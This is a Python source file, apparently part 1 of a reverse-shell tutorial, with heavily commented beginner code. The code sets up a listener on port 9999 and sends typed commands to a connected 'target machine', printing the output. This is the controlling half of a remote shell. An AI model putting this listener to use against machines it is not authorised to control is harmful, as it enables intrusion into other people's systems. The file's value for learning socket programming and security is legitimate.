#got em, part 1
#create sockets for computer to connect
#author:johnjimy som
#date: august 24, 2018
#version: 0.0.1
#objective: これはRSh Scriptのチュートリアルです 

import socket #two computer can communicate
import sys # can run system commands

# Create a socket (allows computers to connect)
# Client needs the IP of the server
def socket_create(): #create a function called socket_create
    try: #try/catch
        global host #ip address where you connect to
        global port #port is a way where data is coming in (helps undefentify)
        global s #server
        host = ''
        port = 9999 #try not to use the common port (for testing)
        s = socket.socket() #s is where /socket or conversation between the computers/servers and target machine.
    except socket.error as msg:
        print("socket creation error: " +str(msg))


#bind socket to port and wait for connection from a client
#where the conversation will take place
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))#you have to convert the port to the string
        s.bind((host, port)) #to bind the socket use bind
        #s.bind((ip address, port ex. "9999")) #call the function "bind", a tuple to a host
        s.listen(3) #listen allows server to accept connections
        #number of bad connections "(#)
    except socket.error as msg:
        print("socket bbinding error: " + str(msg) + "\n" + "retrying.. lol")
        socket_bind() #if fails to bind the socket it will trying until it can bind


#establish a connection with a client (socket must be listening for dem)
#line 30 needs to be there in order to listen before accepting
#"you need to listen before accepting"
def socket_accept():
    conn, address = s.accept() #when you connect to a client
    #conn = references the connection itsefl, (so the conversation)
    #address = info of whoever connected
    print("Connection has been established |" + "IP: " + address[0] + " | Port: " + str(address[1]))
    send_commands(conn)
    conn.close()


#sends commands has to be constant
def send_commands(conn):
    while True: #we want this to work constant otherwise it run once 
        cmd = input()#input from the terminal
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        #cmd typed on are stored in bytes you have to encode and decode.
        #print to user has to bytes to be sent across the networksw
        if len(str.encode(cmd)) > 0: #has to greather than 0 characters
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") #when we get the response its gonna be in btyes so we have to convert to string
            print(client_response,'\n') #'\n' or (pip3 ->)end="" dont give us a new line characred at the endd

def main():
    socket_create()
    socket_bind()
    socket_accept()
    #we dont have to add the send_commands whenever connection accepted automatically calls teh send_commands

main()
#input()
print(sys.version) #check your version on python